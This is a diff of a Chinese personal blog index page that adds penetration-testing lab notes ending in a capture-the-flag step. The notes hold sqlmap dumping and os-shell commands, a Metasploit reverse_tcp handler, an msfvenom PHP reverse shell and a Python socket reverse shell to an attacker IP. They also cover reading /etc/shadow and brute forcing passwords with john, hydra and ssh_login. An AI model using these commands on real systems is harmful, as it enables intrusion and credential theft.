@@ -264,6 +264,164 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/27/SQL注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="newird">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/27/SQL注入/" itemprop="url">SQL注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T10:32:23+08:00">
+                2019-08-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="信息探测"><a href="#信息探测" class="headerlink" title="信息探测"></a>信息探测</h2><p>使用nmap,nikto,dirb</p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>web漏洞扫描器owasp-zap</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>使用sqlmap利用注入漏洞</p>
+<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u url --dbs #查看数据库名</span><br><span class="line">sqlmap -u url -D database --tables #查看数据库表</span><br><span class="line">sqlmap -u url -D database -T table --colmns #查看对应字段</span><br><span class="line">sqlmap -u url -D database -T table -C column --dump #查看对应字段</span><br><span class="line">sqlmap -u url -os-shell #直接获取shell</span><br></pre></td></tr></table></figure>
+<h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><p>使用burpsuite抓包,写入requsest.raw</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.raw -level 5 -risk 3 --dbs --dbms mysql --batch</span><br><span class="line">sqlmap -r requests.raw -level 5 -risk 3 -D database --tables  --dbms mysql --batch</span><br><span class="line">sqlmap -r requests.raw -level 5 -risk 3 -D database -T table --columns  --dbms mysql --batch</span><br><span class="line">sqlmap -r requests.raw -level 5 -risk 3 -D database -T table  -C column --dump  --dbms mysql --batch</span><br></pre></td></tr></table></figure>
+<h2 id="上传shell反弹权限"><a href="#上传shell反弹权限" class="headerlink" title="上传shell反弹权限"></a>上传shell反弹权限</h2><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><h4 id="攻击机监听"><a href="#攻击机监听" class="headerlink" title="攻击机监听"></a>攻击机监听</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/hanlder</span><br><span class="line">msf exploit(hanlder) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(hanlder) &gt; set lhost 攻击机ip</span><br><span class="line">msf exploit(hanlder) &gt; set lport 4444</span><br><span class="line">msf exploit(hanlder) &gt; run</span><br></pre></td></tr></table></figure>
+<h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a>生成反弹shell</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=ip lport=port -f raw</span><br></pre></td></tr></table></figure>
+<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><h4 id="kali自带的"><a href="#kali自带的" class="headerlink" title="kali自带的"></a>kali自带的</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/webshell</span><br></pre></td></tr></table></figure>
+<p>修改host和port</p>
+<h3 id="nc监听端口"><a href="#nc监听端口" class="headerlink" title="nc监听端口"></a>nc监听端口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp port</span><br></pre></td></tr></table></figure>
+<p>美化终端</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure>
+<h2 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h2><p>使用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/shadow</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p>查看敏感文件</p>
+<p>使用su - 提升权限</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://newird.github.io/2019/08/24/Smb (server message block)信息泄露/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -533,7 +691,7 @@
 <ul>
 <li><p>ssh2john id_rsa &gt; rsacrack 将私钥转换为john可以阅读的模式</p>
 </li>
-<li><p>zcat  /user/share/wordlist/rockyou.txt.gx | john – pipe –rules rascrack</p>
+<li><p>zcat  /user/share/wordlists/rockyou.txt.gz | john – pipe –rules rascrack</p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>find  / -perm - 4000 2&gt;/dev/null(错误输出倒空)</p>
 </li>
 </ul>
@@ -692,11 +850,154 @@
 <h3 id="查看配置信息"><a href="#查看配置信息" class="headerlink" title="查看配置信息"></a>查看配置信息</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd 查看用户列表</span><br><span class="line">cat /etc/group 查看用户组</span><br><span class="line">cat / -user 查看属于某个用户的文件</span><br><span class="line">/tmp 查看缓冲区文件</span><br></pre></td></tr></table></figure>
 <h3 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h3><figure class="highlight plain"><figcaption><span>```用户任务编辑,定时执行</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 反弹shell</span><br><span class="line"></span><br><span class="line">```</span><br></pre></td></tr></table></figure>
 <p>#!/user/bin/python<br>import os,subprocess,socket</p>
-<p>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((“攻击机ip”,port))<br>//返回输出信息<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p = subprocess.call([“/bin/sh”,”-i”])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### nc</span><br><span class="line"></span><br><span class="line">```nc -lpv ```未占用端口</span><br><span class="line"></span><br><span class="line">查看占用端口 ```netstat -pantu``</span><br><span class="line"></span><br><span class="line">### 暴力破解</span><br><span class="line"></span><br><span class="line">hydra , medusa</span><br><span class="line"></span><br><span class="line">字典`````` git clone https://github.com/jeanphorn/common-passwod.git</span><br><span class="line"></span><br><span class="line">./cupp.py -i ``````已交互方式创建字典</span><br><span class="line"></span><br><span class="line">### metasploit</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">``````shell</span><br><span class="line">msf&gt;use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(ssh_login) &gt; shoe options</span><br><span class="line">msf auxiliary(ssh_login) &gt; set rhost ip</span><br><span class="line">msf auxiliary(ssh_login) &gt; set username name</span><br><span class="line">msf auxiliary(ssh_login) &gt; set pass_file name.txt</span><br><span class="line">msf auxiliary(ssh_login) &gt; set threads 5</span><br><span class="line">msf auxiliary(ssh_login) &gt; run</span><br><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
+<p>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect((“攻击机ip”,port))<br>//返回输出信息<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>p = subprocess.call([“/bin/sh”,”-i”])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### nc</span><br><span class="line"></span><br><span class="line">```nc -lpv ```未占用端口</span><br><span class="line"></span><br><span class="line">查看占用端口 ```netstat -pantu``</span><br><span class="line"></span><br><span class="line">### 暴力破解</span><br><span class="line"></span><br><span class="line">hydra , medusa</span><br><span class="line"></span><br><span class="line">字典</span><br></pre></td></tr></table></figure></p>
+<p>git clone <a href="https://github.com/jeanphorn/common-passwod.git" target="_blank" rel="noopener">https://github.com/jeanphorn/common-passwod.git</a></p>
+<p>./cupp.py -i<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">已交互方式创建字典</span><br><span class="line"></span><br><span class="line">### metasploit</span><br><span class="line"></span><br><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">``````shell</span><br><span class="line">msf&gt;use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">msf auxiliary(ssh_login) &gt; shoe options</span><br><span class="line">msf auxiliary(ssh_login) &gt; set rhost ip</span><br><span class="line">msf auxiliary(ssh_login) &gt; set username name</span><br><span class="line">msf auxiliary(ssh_login) &gt; set pass_file name.txt</span><br><span class="line">msf auxiliary(ssh_login) &gt; set threads 5</span><br><span class="line">msf auxiliary(ssh_login) &gt; run</span><br><span class="line">session -i 1</span><br></pre></td></tr></table></figure></p>
 <p>优化会话</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&apos;/bin/bash&apos;)&quot;</span><br><span class="line">su -root</span><br></pre></td></tr></table></figure>
 <h2 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h2><p><code>cat flag.txt</code></p>
 
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2018/09/22/序/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="newird">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/head.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/09/22/序/" itemprop="url">序</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-22T22:28:46+08:00">
+                2018-09-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/序/" itemprop="url" rel="index">
+                    <span itemprop="name">序</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h1><h2 id="我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。"><a href="#我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。" class="headerlink" title="我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。"></a>我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。</h2><h2 id="我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。"><a href="#我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。" class="headerlink" title="我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。"></a>我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。</h2>
           
         
       
@@ -885,147 +1186,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://newird.github.io/2018/09/22/序/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="newird">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/head.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="各种笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/09/22/序/" itemprop="url">序</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-09-22T22:28:46+08:00">
-                2018-09-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/序/" itemprop="url" rel="index">
-                    <span itemprop="name">序</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="这是我的第一篇博客"><a href="#这是我的第一篇博客" class="headerlink" title="这是我的第一篇博客"></a>这是我的第一篇博客</h1><h2 id="我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。"><a href="#我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。" class="headerlink" title="我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。"></a>我也不知道要写些什么，希望自己能坚持下去。也算是给自己一个学习的动力。</h2><h2 id="我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。"><a href="#我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。" class="headerlink" title="我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。"></a>我的计划以后把每周学习的笔记都整理到这上边来，嗯，暂时就这样吧。</h2>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1076,7 +1236,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">6</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1098,7 +1258,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
